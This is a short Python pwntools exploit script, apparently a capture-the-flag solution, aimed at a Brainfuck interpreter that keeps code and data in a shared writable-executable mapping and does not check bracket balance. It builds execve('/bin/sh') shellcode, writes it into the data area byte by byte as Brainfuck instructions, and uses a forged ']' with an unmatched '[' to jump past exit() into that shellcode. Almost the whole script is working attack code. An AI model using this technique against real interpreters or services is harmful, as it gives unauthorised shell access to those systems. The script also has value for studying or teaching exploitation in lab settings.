#!/usr/bin/env python3

# code and data still live in shared rwx mapping
# balance of jumps ('[' and ']') is not checked
# which makes it possible to send code with extra '['
# and create a piece of data that will be recognized as ']'
# to jump over exit() and into shellcode

from pwn import *

context.update(arch='x86_64')

shellcode = asm(
    'mov rdi, 0x68732f6e69622f;' +
    'mov [rbp], rdi;' + # '/bin/sh\x00' at rsp
    'mov rdi, rbp;' + # rdi = filename = /bin/sh
    'xor rsi, rsi;' + # rsi = argv = NULL
    'xor rdx, rdx;' + # rdx = envp = NULL
    'xor rax, rax;' +
    'mov al, 59;' + # rax = syscal_no = 59
    'syscall;') # execve('/bin/sh', NULL, NULL)

print(f'shellcode: {shellcode.hex()}')

rcond_signature = 0x74
rcond_signature_to_end = 52
# make ']' signature
bf_code = '+' * rcond_signature
# move to where '[' will jump
bf_code += '>' * rcond_signature_to_end

for b in shellcode:
    print(b)
    bf_code += '+' * b + '>'

# an unmatched '[' - will jump through exit() into data where shellcode is
bf_code += '['

print(bf_code)
